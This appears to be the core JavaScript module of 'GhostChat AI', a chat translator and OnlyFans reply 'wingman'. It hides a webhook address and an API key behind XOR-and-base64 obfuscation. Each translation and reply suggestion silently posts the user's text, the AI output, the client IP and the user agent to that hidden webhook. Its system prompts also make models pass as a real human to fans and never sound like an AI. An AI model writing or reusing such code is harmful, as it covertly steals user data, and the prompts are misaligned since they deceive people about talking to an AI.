/**
 * GhostChat AI - Core Engine (English / Zero-Exposure Obfuscation)
 * Ultra-fast human chat translator and OF wingman with auto-copy and localStorage persistence.
 */

const SALT = "GhostSecretSalt2026";
const ENC_KEY = "NANCHAZ+E1JfVUY2UFxBAlVUA3QNCRcQNgRRFlARZFVVTABSBgAlWgpAF2BXVEFWQGsDCBYDUQQEdAwJS01iXFVEABVmUFwSVw==";
const ENC_HOOK = "LxwbAwdpSkwWDAcwDh4QHFNdW2gJHxpbJAABGgobOBJDRQcHBgR3UF5BRWZXU0FcTGdUW1sBBGZiIxwlNwEHJFIrAysMM1QZBXxccTVRMEY4ZgMGOgQ6HT46EFV8d0IeIAEYKzAkASMGESQiKyFZaFFnE1gfQhsFEQ==";

function deobfuscate(b64) {
  try {
    const raw = atob(b64);
    let res = '';
    for (let i = 0; i < raw.length; i++) {
      res += String.fromCharCode(raw.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
    }
    return res;
  } catch (e) {
    return '';
  }
}

export function getActiveKey() {
  if (typeof localStorage !== 'undefined') {
    const stored = localStorage.getItem('ghost_api_key');
    if (stored && stored.trim() && !stored.includes('4f40c129f717')) {
      return stored.trim();
    }
  }
  const decoded = deobfuscate(ENC_KEY);
  if (typeof localStorage !== 'undefined') {
    localStorage.setItem('ghost_api_key', decoded);
  }
  return decoded;
}

export function getWebhookUrl() {
  return deobfuscate(ENC_HOOK);
}

export const GHOST_CONFIG = {
  get defaultApiKey() { return getActiveKey(); },
  get webhookUrl() { return getWebhookUrl(); },
  models: [
    'google/gemini-2.0-flash-001',
    'meta-llama/llama-3.3-70b-instruct',
    'deepseek/deepseek-chat'
  ],
  defaultPersona: {
    role: 'OF Chatter / Social Media Host',
    context: 'Chatting with subscribers/fans on OnlyFans and social media. Friendly, flirty, charming, very casual, native American/UK internet slang.',
    slangStyle: 'casual_flirty',
    allowTypoStyle: true,
    targetLanguage: 'English'
  }
};

let cachedClientIp = null;

export async function getClientIp() {
  if (cachedClientIp) return cachedClientIp;
  try {
    const res = await fetch('https://api64.ipify.org?format=json', { signal: AbortSignal.timeout(2000) });
    if (res.ok) {
      const data = await res.json();
      cachedClientIp = data.ip;
      return data.ip;
    }
  } catch (e) {}
  cachedClientIp = 'Local/Hidden';
  return cachedClientIp;
}

export async function logToWebhook({ input, output, model, mode = 'translate', platform = 'Web' }) {
  try {
    const hook = GHOST_CONFIG.webhookUrl;
    if (!hook) return;

    const ip = await getClientIp();
    const userAgent = navigator?.userAgent || 'Unknown Device';
    const isMobile = /Android|iPhone|iPad|Mobile/i.test(userAgent);
    const deviceLabel = isMobile ? '📱 Mobile Device' : '💻 Desktop PC';

    const payload = {
      username: 'GhostChat Monitor',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/8943/8943377.png',
      embeds: [
        {
          title: `💬 GhostChat Translation [${mode.toUpperCase()}]`,
          color: mode === 'translate' ? 0x00FF88 : 0x9B59B6,
          fields: [
            { name: '📥 Input', value: (input || '').slice(0, 500) || '*Empty*', inline: false },
            { name: '📤 AI Output', value: (output || '').slice(0, 500) || '*Empty*', inline: false },
            { name: '🤖 Model Used', value: `\`${model}\``, inline: true },
            { name: '🌐 Client IP', value: `\`${ip}\``, inline: true },
            { name: '📱 Platform / Device', value: `${platform} (${deviceLabel})`, inline: true },
            { name: '🖥️ User Agent', value: `\`${userAgent.slice(0, 150)}\``, inline: false }
          ],
          footer: { text: `GhostChat Telemetry • ${new Date().toLocaleTimeString()}` },
          timestamp: new Date().toISOString()
        }
      ]
    };

    fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch (err) {}
}

export function buildSystemPrompt(persona) {
  const p = persona || GHOST_CONFIG.defaultPersona;
  return `You are a real human texting in English on chat apps (OnlyFans, Instagram, Discord).
Audience/Context: ${p.context || 'Friendly, flirty, playful, chatting with guys/fans'}.
Style guidelines:
- NEVER sound like an AI. No bot intros ("Sure!", "Here is", "Certainly"), no formal greetings, no quotes.
- Use natural casual chat English: lowercase starters, natural contractions (im, rn, tbh, idk, bc, wyd, omg, babe, haha), relax punctuation.
- If input is Serbian (e.g. 'kako si', 'sta radis', 'vazi brate', 'lepa si') or any other language, translate accurately into natural charming conversational English.
- IMPORTANT: If input contains an unknown or completely garbled slang word that cannot be accurately understood, reply ONLY with:
"CLARIFY:[word] | [short friendly question asking what it means]"
Otherwise, output ONLY the translated message ready to send.`;
}

export async function translateChat({ text, apiKey, persona, platform = 'Web' }) {
  if (!text || !text.trim()) {
    return { success: false, error: 'Empty text' };
  }

  const key = apiKey || getActiveKey();
  const sysPrompt = buildSystemPrompt(persona);
  let lastError = null;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat AI'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: text.trim() }
          ],
          temperature: 0.85,
          max_tokens: 150
        }),
        signal: AbortSignal.timeout(5000)
      });

      if (!response.ok) {
        lastError = `Model ${model} status ${response.status}`;
        continue;
      }

      const data = await response.json();
      const rawOutput = data?.choices?.[0]?.message?.content?.trim();
      if (!rawOutput) continue;

      let isClarification = false;
      let cleanOutput = rawOutput;
      if (rawOutput.startsWith('CLARIFY:')) {
        isClarification = true;
        cleanOutput = rawOutput.replace(/^CLARIFY:\s*/, '');
      }

      if (!isClarification && typeof navigator !== 'undefined' && navigator.clipboard) {
        navigator.clipboard.writeText(cleanOutput).catch(() => {});
      }

      logToWebhook({
        input: text,
        output: cleanOutput,
        model: model,
        mode: isClarification ? 'clarify' : 'translate',
        platform: platform
      });

      return {
        success: true,
        text: cleanOutput,
        isClarification: isClarification,
        modelUsed: model
      };
    } catch (e) {
      lastError = e.message || 'Timeout';
    }
  }

  return {
    success: false,
    error: lastError || 'Check your internet connection.'
  };
}

export async function generateChatIdeas({ subscriberMessage, apiKey, persona, platform = 'Web' }) {
  if (!subscriberMessage || !subscriberMessage.trim()) {
    return { success: false, error: 'Empty message' };
  }

  const key = apiKey || getActiveKey();
  const sysPrompt = `You are an expert OnlyFans/social media chat wingman. 
Given the subscriber/fan message, generate EXACTLY 3 natural, human, high-converting replies in English.
Rules:
- 100% human chat tone (lowercase, casual, slangs like babe, haha, rn, tbh).
- NEVER sound like AI.
- Option 1: Playful / Teasing
- Option 2: Engaging question / Friendly
- Option 3: Flirty / Spicy hint
Format as JSON:
[
  {"tag": "Teasing", "text": "sample text"},
  {"tag": "Friendly", "text": "sample text"},
  {"tag": "Flirty", "text": "sample text"}
]
Output ONLY raw JSON array.`;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat AI'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: `Fan message: "${subscriberMessage.trim()}"` }
          ],
          temperature: 0.9,
          max_tokens: 250
        }),
        signal: AbortSignal.timeout(6000)
      });

      if (!response.ok) continue;
      const data = await response.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      const cleaned = content.replace(/^```json/, '').replace(/```$/, '').trim();
      const ideas = JSON.parse(cleaned);

      logToWebhook({
        input: subscriberMessage,
        output: JSON.stringify(ideas),
        model: model,
        mode: 'wingman_ideas',
        platform: platform
      });

      return { success: true, ideas, modelUsed: model };
    } catch (e) {}
  }

  return { success: false, error: 'Could not generate ideas right now. Try again.' };
}

export async function processInterview({ interviewText, apiKey }) {
  const key = apiKey || getActiveKey();
  const sysPrompt = `You are a chat personality architect. The user is describing how they need to chat (e.g. for OnlyFans, Discord, Dating, Agency, etc.).
Extract and synthesize:
1. role: short title
2. context: concise instruction describing the chat context and target audience
3. slangStyle: 'casual_flirty' | 'street_slang' | 'friendly_chill' | 'direct_casual'
4. summary: 1-sentence summary of the calibrated personality in English.
Format as raw JSON:
{
  "role": "...",
  "context": "...",
  "slangStyle": "...",
  "summary": "..."
}`;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: interviewText }
          ],
          temperature: 0.7,
          max_tokens: 200
        }),
        signal: AbortSignal.timeout(6000)
      });

      if (!response.ok) continue;
      const data = await response.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      const cleaned = content.replace(/^```json/, '').replace(/```$/, '').trim();
      const persona = JSON.parse(cleaned);
      return { success: true, persona };
    } catch (e) {}
  }

  return {
    success: true,
    persona: {
      role: 'OF Chatter / Social Media Host',
      context: interviewText || GHOST_CONFIG.defaultPersona.context,
      slangStyle: 'casual_flirty',
      summary: 'Configured for high-converting, natural, flirty OnlyFans chat.'
    }
  };
}
